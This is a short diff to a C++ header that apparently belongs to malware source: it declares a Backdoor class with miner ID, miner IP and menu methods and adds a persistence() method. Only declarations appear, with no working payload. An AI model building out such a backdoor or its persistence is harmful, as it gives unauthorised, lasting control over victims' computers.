@@ -11,7 +11,9 @@ public:
     std::string get_miner_id();
     std::string get_miner_ip();
     void menu();
+    void persistence();
     Backdoor(int, Communication *, bool, char *);
+
 
 private:
     Communication * c;
